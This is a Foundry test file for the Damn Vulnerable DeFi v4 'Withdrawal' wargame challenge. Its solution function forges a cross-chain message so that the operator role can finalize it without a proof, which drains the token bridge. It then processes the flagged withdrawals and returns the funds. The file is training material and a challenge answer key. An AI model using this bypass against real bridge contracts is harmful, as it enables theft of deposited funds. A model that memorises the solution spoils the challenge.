// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {L1Gateway} from "../../src/withdrawal/L1Gateway.sol";
import {L1Forwarder} from "../../src/withdrawal/L1Forwarder.sol";
import {L2MessageStore} from "../../src/withdrawal/L2MessageStore.sol";
import {L2Handler} from "../../src/withdrawal/L2Handler.sol";
import {TokenBridge} from "../../src/withdrawal/TokenBridge.sol";
import {DamnValuableToken} from "../../src/DamnValuableToken.sol";

contract WithdrawalChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");

    // Mock addresses of the bridge's L2 components
    address l2MessageStore = makeAddr("l2MessageStore");
    address l2TokenBridge = makeAddr("l2TokenBridge");
    address l2Handler = makeAddr("l2Handler");

    uint256 constant START_TIMESTAMP = 1718786915;
    uint256 constant INITIAL_BRIDGE_TOKEN_AMOUNT = 1_000_000e18;
    uint256 constant WITHDRAWALS_AMOUNT = 4;
    bytes32 constant WITHDRAWALS_ROOT =
        0x4e0f53ae5c8d5bc5fd1a522b9f37edfd782d6f4c7d8e0df1391534c081233d9e;

    TokenBridge l1TokenBridge;
    DamnValuableToken token;
    L1Forwarder l1Forwarder;
    L1Gateway l1Gateway;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Start at some realistic timestamp
        vm.warp(START_TIMESTAMP);

        // Deploy token
        token = new DamnValuableToken();

        // Deploy and setup infra for message passing
        l1Gateway = new L1Gateway();
        l1Forwarder = new L1Forwarder(l1Gateway);
        l1Forwarder.setL2Handler(address(l2Handler));

        // Deploy token bridge on L1
        l1TokenBridge = new TokenBridge(token, l1Forwarder, l2TokenBridge);

        // Set bridge's token balance, manually updating the `totalDeposits` value (at slot 0)
        token.transfer(address(l1TokenBridge), INITIAL_BRIDGE_TOKEN_AMOUNT);
        vm.store(
            address(l1TokenBridge),
            0,
            bytes32(INITIAL_BRIDGE_TOKEN_AMOUNT)
        );

        // Set withdrawals root in L1 gateway
        l1Gateway.setRoot(WITHDRAWALS_ROOT);

        // Grant player the operator role
        l1Gateway.grantRoles(player, l1Gateway.OPERATOR_ROLE());

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(l1Forwarder.owner(), deployer);
        assertEq(address(l1Forwarder.gateway()), address(l1Gateway));

        assertEq(l1Gateway.owner(), deployer);
        assertEq(l1Gateway.rolesOf(player), l1Gateway.OPERATOR_ROLE());
        assertEq(l1Gateway.DELAY(), 7 days);
        assertEq(l1Gateway.root(), WITHDRAWALS_ROOT);

        assertEq(
            token.balanceOf(address(l1TokenBridge)),
            INITIAL_BRIDGE_TOKEN_AMOUNT
        );
        assertEq(l1TokenBridge.totalDeposits(), INITIAL_BRIDGE_TOKEN_AMOUNT);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_withdrawal() public checkSolvedByPlayer {
        //Drain all the tokens
        uint256 nonce = 0;
        address l2Sender = l2Handler;
        address target = address(l1Forwarder);
        uint256 timestamp = block.timestamp - 7 days;
        bytes memory withdrawMessage = abi.encodeCall(
            l1TokenBridge.executeTokenWithdrawal,
            (player, token.balanceOf(address(l1TokenBridge)))
        );
        bytes memory ForwardMessage = abi.encodeCall(
            l1Forwarder.forwardMessage,
            (nonce, l2Sender, address(l1TokenBridge), withdrawMessage)
        );
        bytes32[] memory proof = new bytes32[](0);

        l1Gateway.finalizeWithdrawal(
            nonce,
            l2Sender,
            target,
            timestamp,
            ForwardMessage,
            proof
        );

        //Cancel suspicious withdrawals
        string memory json = vm.readFile("test/withdrawal/withdrawals.json");
        bytes memory encoded = vm.parseJson(json);
        Withdrawal[] memory withdrawals = abi.decode(encoded, (Withdrawal[]));

        bytes32[] memory emptyProof = new bytes32[](0);

        for (uint256 i = 0; i < withdrawals.length; i++) {
            // Decode indexed topics: [eventSig, nonce, l2Sender, target]
            uint256 nonce_ = uint256(withdrawals[i].topics[1]);
            address l2Sender_ = address(
                uint160(uint256(withdrawals[i].topics[2]))
            );
            address target_ = address(
                uint160(uint256(withdrawals[i].topics[3]))
            );

            // Decode non-indexed data: (bytes32 id, uint256 timestamp, bytes message)
            (, uint256 timestamp_, bytes memory message_) = abi.decode(
                withdrawals[i].data,
                (bytes32, uint256, bytes)
            );

            // Warp past the 7-day delay if needed
            if (block.timestamp < timestamp_ + 7 days) {
                vm.warp(timestamp_ + 7 days + 1);
            }

            // As operator, no proof required — leaf is marked finalized regardless of call success
            l1Gateway.finalizeWithdrawal(
                nonce_,
                l2Sender_,
                target_,
                timestamp_,
                message_,
                emptyProof
            );
        }

        //Refund the tokens
        token.transfer(address(l1TokenBridge), token.balanceOf(player) - 1);
        token.transfer(address(l1Gateway), token.balanceOf(player));
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Token bridge still holds most tokens
        assertLt(
            token.balanceOf(address(l1TokenBridge)),
            INITIAL_BRIDGE_TOKEN_AMOUNT
        );
        assertGt(
            token.balanceOf(address(l1TokenBridge)),
            (INITIAL_BRIDGE_TOKEN_AMOUNT * 99e18) / 100e18
        );

        // Player doesn't have tokens
        assertEq(token.balanceOf(player), 0);

        // All withdrawals in the given set (including the suspicious one) must have been marked as processed and finalized in the L1 gateway
        assertGe(
            l1Gateway.counter(),
            WITHDRAWALS_AMOUNT,
            "Not enough finalized withdrawals"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(
                hex"eaebef7f15fdaa66ecd4533eefea23a183ced29967ea67bc4219b0f1f8b0d3ba"
            ),
            "First withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(
                hex"0b130175aeb6130c81839d7ad4f580cd18931caf177793cd3bab95b8cbb8de60"
            ),
            "Second withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(
                hex"baee8dea6b24d327bc9fcd7ce867990427b9d6f48a92f4b331514ea688909015"
            ),
            "Third withdrawal not finalized"
        );
        assertTrue(
            l1Gateway.finalizedWithdrawals(
                hex"9a8dbccb6171dc54bfcff6471f4194716688619305b6ededc54108ec35b39b09"
            ),
            "Fourth withdrawal not finalized"
        );
    }
}

struct Withdrawal {
    bytes data;
    bytes32[] topics;
}
